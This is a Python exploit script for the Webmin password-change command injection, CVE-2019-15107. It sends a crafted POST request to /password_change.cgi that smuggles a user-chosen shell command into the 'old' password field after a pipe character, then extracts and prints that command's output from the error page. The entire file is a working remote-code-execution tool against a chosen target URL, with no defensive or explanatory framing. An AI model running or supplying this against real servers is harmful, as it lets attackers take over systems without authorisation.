#!/usr/bin/python3
# pylint: disable=invalid-name, line-too-long, import-error, no-member, missing-docstring, broad-except

'''
webmin_CVE_2019_15107
'''

import argparse
import re
import sys

import requests
import requests.packages.urllib3

requests.packages.urllib3.disable_warnings()


def CVE_2019_15107(url, cmd):
    '''
    exp
    '''
    vuln_url = url + "/password_change.cgi"
    headers = {
        'Accept-Encoding': "gzip, deflate",
        'Accept': "*/*",
        'Accept-Language': "en",
        'User-Agent': "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)",
        'Connection': "close",
        'Cookie': "redirect=1; testing=1; sid=x; sessiontest=1",
        'Referer': "%s/session_login.cgi" % url,
        'Content-Type': "application/x-www-form-urlencoded",
        'Content-Length': "60",
        'cache-control': "no-cache"
    }
    payload = "user=rootxx&pam=&expired=2&old=test|%s&new1=test2&new2=test2" % cmd
    try:
        r = requests.post(url=vuln_url, headers=headers,
                          data=payload, verify=False)
    except requests.RequestException as exc:
        print(f"request error: {exc}")
        return
    except KeyboardInterrupt:
        return
    except BaseException as exc:
        print(f"error: {exc}")
        return

    if r.status_code == 200 and "The current password is " in r.text:
        print(("\nvuln_url= %s" % vuln_url))
        m = re.compile(
            r"<center><h3>Failed to change password : The current password is incorrect(.*)</h3></center>", re.DOTALL)
        cmd_result = m.findall(r.content)[0]
        print('[+] Success: '+url)
        print(("Command Result = %s" % cmd_result))


parser = argparse.ArgumentParser(description='webmin_CVE_2019_15107')
parser.add_argument('-c', type=str, required=True,
                    help='command to execute on the target')
parser.add_argument('-t', type=str, required=True,
                    help='target url')
args = parser.parse_args()

try:
    CMD = args.c
    URL = "http://"+args.t

    CVE_2019_15107(URL, CMD)
except (KeyboardInterrupt, EOFError, SystemExit):
    sys.exit(1)
